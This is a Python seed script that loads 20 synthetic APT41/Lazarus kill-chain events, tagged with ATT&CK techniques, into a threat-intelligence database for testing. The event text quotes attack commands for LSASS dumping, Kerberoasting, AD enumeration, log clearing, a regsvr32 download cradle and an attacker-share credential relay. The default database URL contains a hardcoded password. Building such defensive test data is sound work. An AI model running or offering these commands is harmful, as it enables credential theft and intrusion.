"""Seed APT attack chain events into a project for testing Phase 35 attack path analysis.

Usage:
    uv run python backend/scripts/seed_apt_events.py <project_id>

Inserts 20 realistic APT41 / Lazarus Group style events covering a full kill-chain:
  Reconnaissance → Resource Development → Initial Access → Execution →
  Persistence → Privilege Escalation → Defense Evasion → Credential Access →
  Discovery → Lateral Movement → Collection → C2 → Exfiltration

Each event gets matching ATT&CK technique tags so the LLM has structured signal.
"""
from __future__ import annotations

import asyncio
import sys
import uuid
from datetime import datetime, timedelta, timezone

from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import sessionmaker

import os

DATABASE_URL = os.environ.get(
    "DATABASE_URL",
    "postgresql+asyncpg://intellibird:9cd4d0e23181679cd9672ba85d30c6bf@localhost:5432/intellibird",
)

APT_EVENTS = [
    # ── Reconnaissance ───────────────────────────────────────────────────────
    {
        "delta_hours": -336,  # 14 days ago
        "title": "APT41 OSINT Collection: LinkedIn Scraping Targeting Finance Sector Employees",
        "description": (
            "Threat intelligence indicates APT41 operatives used automated LinkedIn scraping "
            "tools to harvest employee names, roles, and contact details from financial institutions. "
            "Scraped data correlated with HaveIBeenPwned dumps to identify credential reuse candidates. "
            "Infrastructure traced to AS4134 (China Telecom) relay nodes."
        ),
        "source": "TAXII",
        "tier": "B",
        "tags": ["apt41", "reconnaissance", "finance", "osint", "china"],
        "techniques": ["T1591.004", "T1589.001"],
    },
    {
        "delta_hours": -320,
        "title": "Scanning Activity Against Financial Sector VPN Gateways (CVE-2021-22986)",
        "description": (
            "Mass scanning detected against F5 BIG-IP management interfaces vulnerable to "
            "CVE-2021-22986 (unauthenticated RCE). Source IPs rotated through Tor exit nodes "
            "and residential proxies. Targets include 12 institutions in the UK financial sector. "
            "IOCs: 185.220.101.x/24 range, UA string 'python-requests/2.25.1'."
        ),
        "source": "RSS",
        "tier": "A",
        "tags": ["apt41", "scanning", "cve-2021-22986", "vpn", "f5"],
        "techniques": ["T1595.001", "T1190"],
    },
    # ── Resource Development ──────────────────────────────────────────────────
    {
        "delta_hours": -300,
        "title": "Lazarus Group Registered Lookalike Domains Mimicking SWIFT Provider",
        "description": (
            "MarkMonitor alert: 4 lookalike domains registered mimicking a SWIFT service bureau "
            "used by targeted institutions. Domains: sw1ft-connect[.]com, swift-portal[.]net, "
            "swiftconnect-auth[.]org, myswift-banking[.]com. All registered via Namecheap with "
            "privacy protection. SSL certs issued by Let's Encrypt within 24h of registration. "
            "MX records configured suggesting phishing infrastructure readiness."
        ),
        "source": "TAXII",
        "tier": "A",
        "tags": ["lazarus", "lookalike-domain", "swift", "phishing-infra", "dprk"],
        "techniques": ["T1583.001", "T1587.001"],
    },
    {
        "delta_hours": -288,
        "title": "Cobalt Strike Beacon Profile Matching APT41 TTPs Distributed via GitHub",
        "description": (
            "GitHub takedown request processed for repository hosting a Cobalt Strike malleable "
            "C2 profile identical to APT41's 'POISONPLUG' profile. Repository had 3 forks before "
            "removal. Profile configured to blend with legitimate Office 365 traffic patterns. "
            "Associated binary signed with stolen certificate from South Korean software vendor."
        ),
        "source": "RSS",
        "tier": "B",
        "tags": ["apt41", "cobalt-strike", "c2-infra", "stolen-cert", "poisonplug"],
        "techniques": ["T1587.002", "T1588.004"],
    },
    # ── Initial Access ────────────────────────────────────────────────────────
    {
        "delta_hours": -240,
        "title": "Spearphishing Campaign Targeting CFO Office Staff — DPRK Nexus",
        "description": (
            "High-confidence spearphishing campaign against CFO and treasury staff at 6 UK banks. "
            "Lure: 'Q4 Regulatory Reporting Requirements Update' PDF with embedded OLE object. "
            "Attachment spawns mshta.exe executing remote HTA payload from compromised WordPress site. "
            "Payload fingerprint matches Lazarus Group BLINDINGCAN loader. "
            "3 confirmed clicks, 1 confirmed execution at Tier-1 institution."
        ),
        "source": "TAXII",
        "tier": "A",
        "tags": ["lazarus", "spearphishing", "mshta", "blindingcan", "dprk", "initial-access"],
        "techniques": ["T1566.001", "T1204.002"],
    },
    {
        "delta_hours": -228,
        "title": "Exploitation of ProxyLogon (CVE-2021-26855) Against On-Premises Exchange",
        "description": (
            "CISA advisory confirmed active exploitation of CVE-2021-26855 (ProxyLogon) against "
            "on-premises Exchange servers at financial institutions. Threat actor dropped "
            "China Chopper web shell at /aspnet_client/system_web/. Post-exploitation activity "
            "observed: net.exe reconnaissance, LSASS dump via comsvcs.dll, lateral movement via SMB."
        ),
        "source": "RSS",
        "tier": "A",
        "tags": ["apt41", "proxylogon", "exchange", "webshell", "china-chopper"],
        "techniques": ["T1190", "T1505.003"],
    },
    # ── Execution ─────────────────────────────────────────────────────────────
    {
        "delta_hours": -216,
        "title": "PowerShell Empire Framework Activity — Stage 2 Payload Execution",
        "description": (
            "SIEM alert: Encoded PowerShell (-EncodedCommand) execution chain detected on "
            "compromised host. Base64 decoded payload downloads stage-2 from hxxps://cdn-update[.]net. "
            "Stage-2 is PowerShell Empire stager establishing encrypted C2 channel. "
            "Parent process: outlook.exe (spawned by spearphishing attachment). "
            "Process tree: outlook.exe → mshta.exe → powershell.exe -enc [base64]."
        ),
        "source": "TAXII",
        "tier": "A",
        "tags": ["lazarus", "powershell", "empire", "stage2", "encoded-command"],
        "techniques": ["T1059.001", "T1027"],
    },
    {
        "delta_hours": -210,
        "title": "WMI Subscription Persistence and Lateral Execution via WMIExec",
        "description": (
            "Threat actor established WMI event subscription for persistence: "
            "EventFilter='SCM Event Log Filter' triggering VBScript on system startup. "
            "Also used Impacket WMIExec to execute commands on 3 additional hosts within "
            "the same VLAN. Commands observed: whoami /all, ipconfig /all, net localgroup administrators."
        ),
        "source": "RSS",
        "tier": "B",
        "tags": ["apt41", "wmi", "impacket", "wmiexec", "lateral-execution"],
        "techniques": ["T1047", "T1546.003"],
    },
    # ── Persistence ──────────────────────────────────────────────────────────
    {
        "delta_hours": -200,
        "title": "Registry Run Key Persistence — HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "description": (
            "Forensic artefact: malicious DLL registered under "
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run as 'WindowsUpdateService'. "
            "DLL is a renamed copy of BLINDINGCAN RAT with modified PE header timestamps. "
            "DLL exports: DllRegisterServer, DllMain. Persistence survives reboot and runs as SYSTEM "
            "via service wrapper. Hash: SHA256 a3f8e9c1d4b72065f1a48c3e9d0b6f21..."
        ),
        "source": "TAXII",
        "tier": "A",
        "tags": ["lazarus", "registry-persistence", "blindingcan", "dll-side-loading"],
        "techniques": ["T1547.001", "T1574.002"],
    },
    {
        "delta_hours": -192,
        "title": "Scheduled Task Created for SUNBURST-style Backdoor Persistence",
        "description": (
            "Scheduled task 'SolarWinds.BusinessLayerHostConfig' created on compromised host "
            "mimicking legitimate SolarWinds naming convention. Task runs malicious DLL every 12h "
            "via regsvr32 /s /n /u /i:http[s]:// cradle. Associated with APT29 (Cozy Bear) TTPs "
            "observed in recent TIBER-EU testing exercise targeting financial messaging infrastructure."
        ),
        "source": "RSS",
        "tier": "B",
        "tags": ["apt29", "scheduled-task", "regsvr32", "sunburst", "tiber"],
        "techniques": ["T1053.005", "T1218.010"],
    },
    # ── Privilege Escalation ──────────────────────────────────────────────────
    {
        "delta_hours": -180,
        "title": "Zerologon Exploitation (CVE-2020-1472) — Domain Controller Compromise",
        "description": (
            "Critical: CVE-2020-1472 (Zerologon) exploited against domain controller. "
            "Threat actor reset DC machine account password to empty string, authenticated as DC, "
            "extracted NTDS.dit and SYSTEM hive via VSS shadow copy. "
            "Domain-wide krbtgt hash compromise confirmed — full domain takeover achieved. "
            "All Kerberos tickets invalidated. Emergency password reset initiated across 4,200 accounts."
        ),
        "source": "TAXII",
        "tier": "A",
        "tags": ["apt41", "zerologon", "cve-2020-1472", "domain-compromise", "ntds"],
        "techniques": ["T1068", "T1078.002"],
    },
    {
        "delta_hours": -170,
        "title": "Token Impersonation via Incognito — SYSTEM to Domain Admin Escalation",
        "description": (
            "Metasploit Incognito module used to list and impersonate available Kerberos tokens on "
            "compromised host. Domain admin token impersonated to access SYSVOL and deploy Group "
            "Policy Object containing malicious logon script. GPO pushed to Finance OU affecting "
            "340 workstations. Logon script: net use \\\\attacker-smb\\share /user:guest (credential relay)."
        ),
        "source": "RSS",
        "tier": "B",
        "tags": ["lazarus", "token-impersonation", "gpo-abuse", "lateral-movement"],
        "techniques": ["T1134.001", "T1484.001"],
    },
    # ── Defense Evasion ───────────────────────────────────────────────────────
    {
        "delta_hours": -160,
        "title": "AMSI Bypass via Reflection and ETW Patching — AV Evasion Confirmed",
        "description": (
            "PowerShell AMSI bypass using System.Management.Automation.AmsiUtils reflection "
            "to patch amsiInitFailed to $true. Followed by ETW (Event Tracing for Windows) "
            "patching via NtTraceControl syscall to blind Sysmon and Windows Defender. "
            "Technique variant matches tooling published by APT41 affiliate tracked as BARIUM."
        ),
        "source": "TAXII",
        "tier": "B",
        "tags": ["apt41", "amsi-bypass", "etw-patch", "av-evasion", "barium"],
        "techniques": ["T1562.001", "T1562.006"],
    },
    # ── Credential Access ─────────────────────────────────────────────────────
    {
        "delta_hours": -148,
        "title": "LSASS Memory Dump via MiniDump — Credential Harvesting at Scale",
        "description": (
            "LSASS process memory dumped via comsvcs.dll MiniDump: "
            "'rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump lsass_pid lsass.dmp full'. "
            "Dump file compressed and staged at C:\\ProgramData\\Microsoft\\dr.tmp. "
            "Offline cracking: 847 NTLM hashes recovered including 12 service accounts and "
            "3 privileged admin accounts. Credential material used for SWIFT operator account access."
        ),
        "source": "RSS",
        "tier": "A",
        "tags": ["lazarus", "lsass-dump", "credential-harvesting", "ntlm", "swift-access"],
        "techniques": ["T1003.001"],
    },
    {
        "delta_hours": -140,
        "title": "Kerberoasting Attack — 23 Service Account Hashes Extracted",
        "description": (
            "Kerberoasting detected via Rubeus: 'Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt'. "
            "23 service account SPNs targeted, hashes extracted for offline cracking. "
            "4 accounts cracked within 6h using hashcat with rockyou+rules. "
            "Cracked accounts include sqlsvc, svc-backup, svc-monitoring with elevated privileges."
        ),
        "source": "TAXII",
        "tier": "B",
        "tags": ["apt41", "kerberoasting", "rubeus", "service-accounts"],
        "techniques": ["T1558.003"],
    },
    # ── Discovery ─────────────────────────────────────────────────────────────
    {
        "delta_hours": -130,
        "title": "Internal Network Enumeration — BloodHound AD Recon Detected",
        "description": (
            "SharpHound collector executed from compromised host: 'SharpHound.exe -c All --zipfilename ad_data'. "
            "LDAP queries for all domain users, computers, groups, ACLs, and GPOs. "
            "BloodHound analysis identified shortest path to Domain Admin: 3 hops via nested group membership. "
            "Also: nmap SYN scan of 10.0.0.0/16 range, port 443/445/3389/8443 — 847 live hosts identified."
        ),
        "source": "RSS",
        "tier": "B",
        "tags": ["apt41", "bloodhound", "sharphound", "ad-recon", "nmap"],
        "techniques": ["T1087.002", "T1046"],
    },
    # ── Lateral Movement ──────────────────────────────────────────────────────
    {
        "delta_hours": -118,
        "title": "Pass-the-Hash via SMB — Lateral Movement to SWIFT Application Server",
        "description": (
            "Pass-the-Hash attack using harvested NTLM credentials to authenticate to SWIFT "
            "Alliance Access application server (10.10.5.45). Authentication via SMB using "
            "Impacket smbclient. Post-authentication: directory listing of SWIFT transaction logs, "
            "installation of custom SWIFT message interceptor DLL (swiftsnoop.dll) in "
            "C:\\SWIFTAlliance\\RA\\bin\\. Interceptor logs all outbound MT103 messages."
        ),
        "source": "TAXII",
        "tier": "A",
        "tags": ["lazarus", "pass-the-hash", "swift", "lateral-movement", "mt103"],
        "techniques": ["T1550.002", "T1021.002"],
    },
    # ── Collection ────────────────────────────────────────────────────────────
    {
        "delta_hours": -100,
        "title": "SWIFT Transaction Data Staged for Exfiltration — 6 Months of MT103 Messages",
        "description": (
            "DLP alert: large archive operation on SWIFT application server. "
            "PowerShell script compressed 6 months of MT103 transaction logs (4.2GB) to "
            "C:\\ProgramData\\Intel\\telemetry.cab. "
            "Archive contains beneficiary account details, BIC codes, and transaction amounts "
            "for approximately 18,400 international wire transfers. "
            "Data staged for exfiltration via HTTPS to cdn-update[.]net:443."
        ),
        "source": "RSS",
        "tier": "A",
        "tags": ["lazarus", "swift", "data-staging", "mt103", "exfiltration-prep", "financial-data"],
        "techniques": ["T1074.001", "T1560.001"],
    },
    # ── Command and Control ───────────────────────────────────────────────────
    {
        "delta_hours": -88,
        "title": "HTTPS C2 Beacon — BLINDINGCAN RAT Communicating via Cloudflare CDN",
        "description": (
            "Network traffic analysis: periodic HTTPS POST requests every 4±1 minutes to "
            "cdn-update[.]net (104.21.x.x — Cloudflare). Payload encrypted with ChaCha20. "
            "JA3 fingerprint matches known BLINDINGCAN RAT variants. "
            "DNS-over-HTTPS used for C2 domain resolution (bypassing DNS monitoring). "
            "Beacon commands observed include file upload/download, process execution, screenshot."
        ),
        "source": "TAXII",
        "tier": "A",
        "tags": ["lazarus", "blindingcan", "c2", "https-beacon", "cloudflare", "chacha20"],
        "techniques": ["T1071.001", "T1132.001"],
    },
    # ── Exfiltration ─────────────────────────────────────────────────────────
    {
        "delta_hours": -48,
        "title": "Confirmed Exfiltration of SWIFT Transaction Archive — 4.2GB via HTTPS",
        "description": (
            "Confirmed exfiltration event: 4.2GB archive (telemetry.cab) uploaded in 42 chunks "
            "of 100MB via BLINDINGCAN HTTPS C2 channel to cdn-update[.]net. "
            "Upload duration: 3h 14min. Post-exfiltration: archive deleted, event logs cleared "
            "via 'wevtutil cl System' and 'wevtutil cl Security'. "
            "Lazarus Group assessed to be preparing fraudulent SWIFT transactions using harvested data."
            " SWIFT ISAC notified. Emergency fraud monitoring activated on 18,400 identified accounts."
        ),
        "source": "TAXII",
        "tier": "A",
        "tags": ["lazarus", "exfiltration", "swift", "financial-fraud", "dprk", "critical"],
        "techniques": ["T1041", "T1070.001"],
    },
]


async def seed(project_id: str) -> None:
    import hashlib

    engine = create_async_engine(DATABASE_URL, echo=False)
    async_session = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

    async with async_session() as db:
        now = datetime.now(tz=timezone.utc)
        inserted = 0

        for ev in APT_EVENTS:
            event_id = uuid.uuid4()
            observed_at = now + timedelta(hours=ev["delta_hours"])
            content_hash = hashlib.sha256(
                f"{project_id}:{ev['title']}:{observed_at.isoformat()}".encode()
            ).hexdigest()

            # Insert event — schema: stix_type (not null), content_hash (not null)
            await db.execute(
                text("""
                    INSERT INTO events (
                        id, title, description, stix_type,
                        tags, observed_at, project_id, fetched_at,
                        content_hash, created_at
                    ) VALUES (
                        :id, :title, :description, :stix_type,
                        :tags, :observed_at, :project_id, :fetched_at,
                        :content_hash, :created_at
                    )
                    ON CONFLICT (project_id, source_id, content_hash, observed_at) DO NOTHING
                """),
                {
                    "id": event_id,
                    "title": ev["title"],
                    "description": ev["description"],
                    "stix_type": "x-intellibird-event",
                    "tags": ev["tags"],
                    "observed_at": observed_at,
                    "project_id": uuid.UUID(project_id),
                    "fetched_at": now,
                    "content_hash": content_hash,
                    "created_at": now,
                },
            )

            # Insert ATT&CK technique tags
            for technique_id in ev["techniques"]:
                await db.execute(
                    text("""
                        INSERT INTO attack_technique_tags
                            (id, event_id, technique_id, tag_source, confidence, created_at)
                        VALUES
                            (:id, :event_id, :technique_id, 'analyst', 0.95, :created_at)
                        ON CONFLICT DO NOTHING
                    """),
                    {
                        "id": uuid.uuid4(),
                        "event_id": event_id,
                        "technique_id": technique_id,
                        "created_at": now,
                    },
                )

            inserted += 1

        await db.commit()
        print(f"Seeded {inserted} APT events into project {project_id}")

    await engine.dispose()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: uv run python {sys.argv[0]} <project_id>")
        print(f"\nAvailable: P00055 External = 636d56b1-9209-4543-8267-efb54de7c24d")
        sys.exit(1)

    asyncio.run(seed(sys.argv[1]))
